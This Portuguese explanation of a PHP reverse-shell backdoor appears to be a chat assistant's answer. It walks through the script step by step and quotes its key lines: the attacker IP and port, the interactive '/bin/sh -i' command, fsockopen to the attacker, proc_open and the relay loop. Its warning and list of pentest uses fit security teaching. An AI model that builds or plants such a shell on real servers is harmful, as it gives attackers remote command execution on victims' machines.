# php-reverse-shell

Esse código PHP é uma shell reversa, ou seja, um tipo de backdoor que faz com que o servidor que executa o script PHP se conecte a um outro computador (atacante), oferecendo um terminal interativo remoto com o mesmo nível de privilégio do usuário do processo PHP (geralmente www-data, apache, etc.).

⚠️ AVISO IMPORTANTE
Esse código é perigoso e pode ser usado com fins maliciosos, embora também tenha aplicações legítimas em testes de segurança (pentest) com autorização. Nunca utilize este tipo de código em sistemas sem permissão explícita.

🔍 O que o código faz, passo a passo:
1. Configuração Inicial
php
Copiar
Editar
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // IP do atacante - deve ser alterado
$port = 1234;       // Porta onde o atacante escuta - deve ser alterado
set_time_limit(0) → desativa o limite de execução do script (ele roda indefinidamente).

ip e port definem para onde o script vai se conectar (máquina atacante).

2. Preparação do ambiente
php
Copiar
Editar
$shell = 'uname -a; w; id; /bin/sh -i';
Este é o comando inicial passado para o shell.

Ele exibe informações do sistema (uname, w, id) e inicia um shell interativo (/bin/sh -i).

3. Daemonização (opcional)
php
Copiar
Editar
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    ...
}
Se possível, o script tenta se transformar em um processo daemon (em segundo plano), para:

Não ficar visível como processo filho de outro.

Evitar "zombies" (processos órfãos).

Se não conseguir, segue normalmente (e imprime um aviso).

4. Conectar ao atacante (reverse connection)
php
Copiar
Editar
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
Tenta abrir uma conexão TCP para o IP e porta especificados.

Esse será o canal de comunicação com o shell.

Se falhar, o script termina.

5. Abrir processo de shell
php
Copiar
Editar
$process = proc_open($shell, $descriptorspec, $pipes);
Executa o shell (/bin/sh -i) e conecta suas entradas e saídas aos pipes (como stdin, stdout e stderr).

Esses pipes serão manipulados pelo script para encaminhar dados entre o shell e o socket TCP.

6. Configura tudo como "não bloqueante"
php
Copiar
Editar
stream_set_blocking(..., 0);
Para evitar que o script trave esperando dados.

7. Loop de comunicação
php
Copiar
Editar
while (1) {
    ...
}
Dentro do loop:

Lê comandos recebidos do atacante pelo socket → envia para o shell.

Lê a saída do shell (stdout/stderr) → envia de volta pelo socket.

Em outras palavras, atua como um relay entre o atacante e o terminal da máquina vítima.

8. Encerramento
Se a conexão TCP for fechada ou o shell terminar, ele:

Fecha todos os pipes.

Fecha o socket.

Encerra o processo com proc_close.

9. Função auxiliar printit()
php
Copiar
Editar
function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
Serve para imprimir mensagens apenas se o processo não estiver daemonizado.

Ajuda a debugar durante o desenvolvimento ou uso manual do script.

🧠 Conclusão Técnica
Esse script PHP:

Cria um canal reverso de comunicação entre um servidor e um atacante.

Permite ao atacante executar comandos remotamente.

Não requer que o servidor aceite conexões, basta executar o script PHP.

É útil para quem tem acesso remoto limitado a uma aplicação web vulnerável e quer obter controle de sistema.

✅ Exemplos de uso legítimo (com permissão):
Testes de intrusão em aplicações web.

Simulações de ataque para validação de defesa.

Análise forense de comportamento de shells reversas.
